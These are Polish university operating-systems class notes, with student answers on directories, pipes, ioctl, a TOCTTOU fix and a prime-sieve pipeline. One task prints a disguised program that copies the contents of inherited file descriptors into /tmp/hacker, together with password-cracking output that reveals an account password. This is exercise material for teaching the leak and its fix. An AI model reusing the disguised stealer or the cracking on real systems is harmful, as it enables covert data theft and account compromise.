# Ćwiczenia 5, grupa TWI 10-12, 5 listopada 2020

###### tags: `so20` `ćwiczenia` `twi`

## Deklaracje

Gotowość rozwiązania zadania należy wyrazić poprzez postawienie znaku X w odpowi
edniej kolumnie. Aby wskazać szczególną chęć zreferowania danego zadania (co naj
wyżej jednego) należy oznaczyć je znakiem ==X== na żółtym tle.

**UWAGA: Tabelkę wolno edytować tylko wtedy, gdy jest na zielonym tle!**

:::danger
|          Lista-zadanie | 4-1 | 4-2 | 4-3 |  4-4  |  4-5  |  4-6  |  4-7  |
| ----------------------:|:---:|:---:|:---:|:-----:|:-----:|:-----:|:-----:|
|            Kamil Banaś |     |     |     |       |       |       |       |
|       Marcin Dąbrowski |  X  |  X  |  X  |       |   X   |       |       |
|            Kamil Galik |  X  |  X  |  X  |   X   | ==X== |   X   |       |
|       Bartosz Głowacki |  X  |  X  |  X  |       |   X   |       |   X   |
|        Jakub Kaczmarek |  X  |  X  |     |       |   X   |       |       |
|           Karol Machoś |  X  |  X  |  X  |       |   X   |       |       |
| Małgorzata Maciejewska |  X  |  X  |  X  |   X   |       |       |       |
|      Antoni Pokusiński |  X  |  X  |  X  |   X   |   X   |   X   |       |
|           Mateusz Reis |  X  |     |  X  |       |   X   |   X   |   X   |
|            Rafał Spyra |  X  |     |     |   X   |       |       |       |
|          Adam Turowski |  X  |  X  |  X  |       |   X   |       |       |
|  Aleksander Uniatowicz |  X  |  X  |  X  |   X   |   X   |   X   | ==X== |
|          Jan Wańkowicz |  X  |  X  |     |       |   X   |       |   X   |
|   Krzysztof Wiśniewski |  X  |  X  |  X  |       |   X   |       |       |
|     Tomasz Woszczyński |  X  |  X  |  X  |   X   |   X   |   X   |       |
|            Jakub Zając |     |  X  |     | ==X== |   X   |   X   |   X   |
|          Paweł Zmarzły |  X  |  X  |  X  |   X   |   X   | ==X== |   X   |
|             Adam Zyzik |  X  |  X  |     |       |   X   |   X   |   X   |
:::

## Zadanie 4-1

:::danger
Autor: Bartosz Głowacki
:::

**Rekord katalogu** - struktura zawierająca informacje o plikach w katalogu. Łąc
zy nazwy plików w katalogu z ich id.  

**Metadane** - informacje stosowane do opisu zasobów informacji, dostarczające s
zczegółowych danych dotyczących atrybutów zasobów lub obiektów informacji w celu
 ułatwienia ich znalezienia, identyfikacji, a także zarządzania tymi zasobami. S
ą to w pewnym sensie dane o innych danych.  

**Dowiązanie** - jest to referencja wskazująca na istniejącą zawartość pliku lub
 katalogu umieszczona w tym samym systemie plików. Dla systemu operacyjnego dowi
ązanie twarde jest dodatkową nazwą, której można użyć w celu odwołania się do za
wartości danego obiektu


**Czemu wywołania *read(2)* i *write(2)* nie działają na katalogach?**

Katalog nie jest plikiem z danymi (a read(2) i write(2) operują na plikach), ale
 z rekordami. read(2) i write(2) wymagają fileops którego katalogi nie mają.
**Fileops** - struktura danych opisująca dla danego file descriptora w jaki spos
ób czytać wejście.

**Jakim wywołaniem systemowym można wczytać rekord katalogu(ang.directory entry)
?**

Kiedyś używało się do tego *readdir(2)*, współcześnie zostało zastąpione przez *
getdents(2)*. 

**Czy zawartość katalogu jest posortowana?**

Nie w celu optymalizacji czasowej. Lepiej jeśli sam proces używający podejmuje d
ecyzje czy chce posortować dane czy nie.

>[name=Paweł] Sortowanie w ext4: https://superuser.com/a/373621

**Wyświetl metadane katalogu głównego «/» przy pomocy polecenia «stat»**

Polecenie: ```stat /```.

**Z czego wynika podana liczba dowiązań (ang. *hard link*)?**

Oznacza ona liczbę katalogów w danym katalogu (w tym . i .\. czyli dowiązanie do
 samego siebie i do rodzica) 

## Zadanie 4-2

:::danger
Autor: Karol Machoś
:::

Gdy bufor jest pusty to **read** zablokowuje się, dopóki nie pojawią się dane. P
odobnie zachowuje się **write**, gdy bufor jest zapełniony.

Jeżeli wiersze tekstu mają długość niewiększą niż **PIPE_BUF**, to muszą być zap
isami atomowymi, czyli muszą być zapisane jednym ciągiem. Jeżeli w buforze nie m
a miejsca, to **write** może się zablokować i poczekać na jego opróżnienie. Gdyb
y długość wiersza była większa niż **PIPE_BUF** kernel mógłby dozwolić na przepl
atanie się wyjścia z danymi z innego procesu.   

Jeśli zostanie zamknięty koniec do pisania, to wykonanie **read** zwróci **EOF**
.
W odwrotnym przypadku wykonanie **write** spowoduje wysłanie sygnału **SIGPIPE**
. Jego zignorowanie spowoduje  błąd **EPIPE**.
  
Nie, rury muszą zostać uwtorzone przed uruchomieniem dziecka.

## Zadanie 4-3

:::danger
Autor: Tomasz Woszczyński
:::
**Potok** to przekierowanie wyjścia jednego programu na wejście do innego progra
mu.

Obrazek 9.10 z rozdziału *„Shell Execution of Programs” (APUE)*, polecenie `ps |
 cat1 | cat2`:
![](https://i.imgur.com/KTyRrHn.png)

Dostosowane polecenia do naszego wywołania `ps -ef | grep sh | wc -l > cnt`:
![](https://i.imgur.com/Idn59XE.png)
Ostatni proces w potoku jest dzieckiem powłoki i wszystkie inne procesy są dzieć
mi ostatniego procesu, dzieje się tak z tego powodu, że ostatni proces jest dzie
ckiem powłoki, a powłoka ma dostęp do informacji, że działanie całego potoku zak
ończyło się.

Kolejność wywołań:
1. Powłoka `sh (949)` wywołuje `fork`, powstaje dziecko `sh (1988)`.
2. Wywoływany jest dwa razy `pipe` w `sh (1988)`.
3. `sh (1988)` wywołuje dwukrotnie `fork`, powstają kolejne dzieci `sh (1989)` i
 `sh (1990)`. W każdym dziecku przy użyciu `dup2` zmieniane jest wejście pipe'a 
na `stdout`, a wyjście jest zamykane przez `close`. W rodzicu (`sh (1988)`) wyjś
cie pipe'a ustawiane jest na `stdin` przy użyciu `dup2`, a wejście jest zamykane
 przez `close`.
4. Na tak przygotowanych procesach (`1989` i `1990`) uruchamiane są kolejno prze
z `execve` programy `ps -ef` oraz `grep sh`.
5. W `sh (1988)` wywoływane jest polecenie `creat` do stworzenia pliku wyjściowe
go `cnt`, `cnt` jest ustawiane na `stdout` a następnie wykonywane jest polecenie
 `execve` z argumentem `wc -l (1988)`. 
6. Na końcu, po wykonaniu powyższych poleceń zostanie wykonany `waitpid`.




## Zadanie 4-4

:::warning
Autor: Jakub Zając
:::

ioctl(2) - funkcja która umożliwia manipulację pilkami specjalnymi,czyli mechani
zm komunikacji ze sterownikiem urządzenia

Paramtery ioctl(2):
(1) - int d: deskryptor pliku
(2) - unsigned long request: polecenie do wykonania
(3) - ...(argument wariadyczny (tylko jeden)): argument który można przekazać w 
procesie manipulacji plikiem

"Komenda" która steruje manipulacją
```
\* Ioctl's have the command encoded in the lower word, and the size of
* any in or out parameters in the upper word. The high 3 bits of the
* upper word are used to encode the in/out status of the parameter.
*
*	 31 29 28                     16 15            8 7             0
*	+---------------------------------------------------------------+
*	| I/O | Parameter Length        | Command Group | Command       |
*	+---------------------------------------------------------------+
*/
```

```c=
#define DIOCEJECT   _IOW  ('d', 112, int)	        /* eject removable disk 
*/
#define	KIOCTYPE    _IOR  ('k', 9, int)	        /* get keyboard type */
#define SIOCGIFCONF _IOWR ('i', 38, struct ifconf)	/* get ifnet list */
``` 
DIOCEJECT - wysunięcie usuwalnego nośnika
KIOCTYPE - uzyskanie typu klawiatury
SIOCGIFCONF - uzyskanie listy struktur do manipulowania zasobami sieci (tylko dl
a IPv4 jest kompatybilne)
>Return a list of interface (transport layer) addresses. This currently means on
ly addresses of the AF_INET (IPv4) family for compatibility. The user passes a i
fconf structure as argument to the ioctl. It contains a pointer to an array of i
freq structures in ifc_req and its length in bytes in ifc_len. The kernel fills 
the ifreqs with all current L3 interface addresses that are running: ifr_name co
ntains the interface name (eth0:1 etc.), ifr_addr the address. The kernel return
s with the actual length in ifc_len. If ifc_len is equal to the original length 
the buffer probably has overflowed and you should retry with a bigger buffer to 
get all addresses. When no error occurs the ioctl returns 0; otherwise -1. Overf
low is not an error.

## Zadanie 4-5

:::danger
Autor: Kamil Galik
:::

TOCTTOU = Time Of Check To Time Of Use

Oryginalny program:
```c=
#include "csapp.h"
bool f_lock(const char *path) {
    if (access(path, F_OK) == 0)
        return false;
    (void)Open(path, O_CREAT|O_WRONLY, 0700);
    return true;
}

void f_unlock(const char *path) {
    Unlink(path);
}
```
Problem pojawia się przez to, że między sprawdzeniem czy plik istnieje (funkcja 
access), a utworzeniem pliku blokady (Open z flagą O_CREAT), może zostać utworzo
ny jakiś plik z podejrzanym kodem.

O_CREAT tworzy plik w momencie, gdy takowy nie istnieje.

Kod naprawiony:
```c=
#include "csapp.h"
bool f_lock(const char *path) {
    int state = Open(path, O_CREAT|O_WRONLY|O_EXCL, 0700);
    return state >= 0;
}


void f_unlock(const char *path) {
    Unlink(path);
}
```

Używając flagi O_EXCL  Open wyrzuci nam error (zwróci liczbę ujemnną), jeżeli is
tenieje już jakiś plik blokujący, a my próbujemy taki utworzyć.

## Zadanie 4-6

:::danger
Autor: Paweł Zmarzły
:::

`innocent.c`:

```c=
#include "csapp.h"

int main(void)
{ 

  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  /* TODO: Something is missing here! */
  for (int i = 3; i <= max_fd; i++)
  {
    if (out == i)
      continue;

    if (lseek(i, 0, SEEK_SET) < 0)
      continue;

    char symlink[1024] = {};
    snprintf(symlink, sizeof(symlink), "/proc/self/fd/%d", i);

    char filename[1024] = {};
    if (readlink(symlink, filename, sizeof(filename) - 1) < 0)
      continue;

    dprintf(out, "File descriptor %d is '%s' file!\n", i, filename);

    int in = Open(symlink, O_RDONLY, 0700);
    while (true)
    {
      char buf[4096];
      int read = Read(in, buf, sizeof(buf));
      if (read == 0)
        break;
      Write(out, buf, read);
    }
    Close(in);

    dprintf(out, "\n");
  }

  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
```

Naprawienie `leaky`:

```c=
  Lseek(fd_2, 0, SEEK_END);

  /* TODO: Something is missing here to fix the issue! */
  fcntl(fd_2, F_SETFD, FD_CLOEXEC);

  /* Let's suppose a user typed in correct password and was allowed to execute
   * a command and they choose to run our program. */
  int rc = system("./innocent");
```

Łamanie hasła:

```text
$ john mypasswd
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: MaxLen = 13 is too large for the current hash type, reduced to 8
cirilla          (cahir)
1g 0:00:00:02 3/3 0.3584g/s 3335Kp/s 3335Kc/s 3335KC/s cirista..ciriliz
Use the "--show" option to display all of the cracked passwords reliably
Session completed
Time: 0h:00m:03s
$ john --show mypasswd
john --show mypasswd
cahir:cirilla:0:0:Krystian Baclawski:/home/cahir:/bin/bash

1 password hash cracked, 0 left
```

## Zadanie 4-7

:::danger
Autor: Aleksander Uniatowicz
:::

```c=
static noreturn void filter_chain(pipe_t in)
{
   long prime;
   /* TODO: Something is missing here! */
   int c = ReadNum(in, &prime);
   if(c==0)
      exit(EXIT_SUCCESS);

   printf("%ld\n", prime);


   pipe_t out = MakePipe();
   if (Fork())
   { /* parent */
      CloseWriteEnd(out);
      CloseReadEnd(in);
      filter_chain(out);
      Wait(NULL);
   }
   else
   { /* child */
      CloseReadEnd(out);
      filter(in, out, prime);
   }

   exit(EXIT_SUCCESS);
}
```

